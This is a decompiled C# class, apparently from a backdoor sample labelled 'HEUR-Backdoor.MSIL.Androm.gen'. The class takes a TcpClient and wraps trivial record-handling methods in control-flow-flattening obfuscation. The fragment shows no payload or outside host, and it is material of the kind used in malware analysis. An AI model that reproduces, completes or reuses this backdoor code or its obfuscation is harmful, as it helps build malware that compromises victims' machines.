// Decompiled with JetBrains decompiler
// Type: InvalidOleVariantTypeExcept.Pages.SpecificationValuePage
// Assembly: InvalidOleVariantTypeExcept, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 9E82E8E9-C8CD-41F7-BA61-2A9379AE4148
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Backdoor.MSIL.Androm.gen-02b77b24d467552510c0f56dbde53c82e4e932dcaeb0e08fcfec00d4c359a9b9.exe

using InvalidOleVariantTypeExcept.Filters;
using InvalidOleVariantTypeExcept.Identifiers;
using System.Net.Sockets;
using System.Runtime.CompilerServices;
using TGL.Licensing;
using TGL.Polices;

namespace InvalidOleVariantTypeExcept.Pages
{
  public class SpecificationValuePage : WriterFieldID
  {
    private static int _Resolver;
    private SpecificationValuePage m_Registry;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public SpecificationValuePage(TcpClient reference)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              UtilsContextLicense.ListWorker();
              int num3 = 5;
              num2 = SpecificationValuePage.CollectInfo() ? num3 : num3;
              continue;
            case 1:
            case 5:
              goto label_8;
            case 2:
              goto label_3;
            case 4:
              goto label_7;
            case 6:
              goto label_2;
            default:
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_7;
          }
        }
label_3:
        this.ReadRecord().PublishRecord(RoleValueFilter.RestartVisitor(50) + SpecificationValuePage._Resolver++.ToString());
label_7:
        this.ReadRecord().QueryRecord(SpecificationValuePage._Resolver);
        num1 = 6;
        continue;
label_8:
        // ISSUE: explicit constructor call
        base.\u002Ector(reference);
        num1 = 2;
      }
label_2:;
    }

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public SpecificationValuePage DisableRecord() => this.m_Registry;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public void PrepareRecord(SpecificationValuePage config) => this.m_Registry = config;

    [SpecialName]
    [MethodImpl(MethodImplOptions.NoInlining)]
    public int DefineRecord() => this.ReadRecord().LogoutRecord();

    [MethodImpl(MethodImplOptions.NoInlining)]
    public override void GetResolver(Identifier task)
    {
      int num1 = 3;
      while (true)
      {
        int num2 = num1;
        bool flag;
        while (true)
        {
          switch (num2)
          {
            case 0:
            case 3:
              goto label_2;
            case 1:
              if (!flag)
                goto label_4;
              else
                goto case 2;
            case 2:
            case 4:
              this.m_Registry.SortRecord(task);
              if (true)
              {
                num2 = 5;
                continue;
              }
              goto label_2;
            case 5:
              goto label_8;
            default:
              if (true)
              {
                num2 = 4;
                continue;
              }
              goto label_8;
          }
        }
label_2:
        flag = this.ChangeRecord();
        num1 = 1;
      }
label_4:
      return;
label_8:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    public bool ChangeRecord() => this.m_Registry != null;

    [MethodImpl(MethodImplOptions.NoInlining)]
    public static void FlushRecord() => SpecificationValuePage._Resolver = 0;

    internal static bool VisitInfo() => true;

    internal static bool CollectInfo() => false;
  }
}
